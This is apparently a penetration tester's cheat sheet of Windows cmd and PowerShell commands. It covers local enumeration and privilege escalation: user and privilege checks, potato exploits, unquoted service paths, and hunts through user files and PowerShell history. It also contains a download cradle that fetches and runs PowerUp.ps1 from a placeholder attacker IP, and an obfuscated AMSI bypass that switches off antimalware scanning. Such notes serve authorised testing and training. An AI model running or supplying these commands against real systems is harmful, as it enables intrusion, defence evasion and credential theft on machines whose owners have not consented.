::                      cmd.exe

whoami
:: SeImpersonatePrivilege: PrintSpoofer, JuicyPotato, GodPotato, RottenPotato
whoami /priv
whoami /groups

net user added_user
net localgroup Administrators

ipconfig /all
route print
netstat -ano

systeminfo

:: unquoted service paths outside of C:\Windows
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

:: scheduled tasks and their properties             | Select-String -Pattern "C:\\Users" -Context 10, 10
schtasks /query /fo LIST /v



::                      powershell.exe

Get-LocalUser
Get-LocalGroup Administrators

:: 32 bit applications
Get-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname
:: 64 bit applications
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | select displayname
:: also try C:\Program Files\ for both architectures and all C:\Downloads

Get-Process notepad.exe | Format-List *

Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

:: PS History (powershell history, PSReadline history, transcript files (also check the event viewer for script block logs if GUI access))
Get-History
(Get-PSReadlineOption).HistorySavePath
Get-ChildItem -Path C:\Users\ -Include *transcript*.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *console*.txt -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *console*.txt -File -Recurse -ErrorAction SilentlyContinue
:: Event Viewer > Applications and Services Logs > Microsoft > Windows > PowerShell > Operational       -->         location of script block logs

:: grab the Startup Type of a service
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like '<service-name>'}

Get-Service <service-name> | Format-List *

:: running services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

:: running services outside of system32
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Select-String -Pattern "C:\\Windows\\system32" -NotMatch

:: running and stopped services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

:: Download cradle to store code in memory
IEX (New-Object Net.Webclient).downloadstring("http://<attacker-IP>/PowerUp.ps1")

:: AMSI bypasses            -->             more at: https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_12.ps1

$A="5492868772801748688168747280728187173688878280688776"
$B="8281173680867656877679866880867644817687416876797271"
function C($n, $m){
[string]($n..$m|%{[char][int](29+($A+$B).substring(($_*2),2))})-replace " "}
$k=C 0 37; $r=C 38 51
$a=[Ref].Assembly.GetType($k)
$a.GetField($r,'NonPublic,Static').SetValue($null,$true)


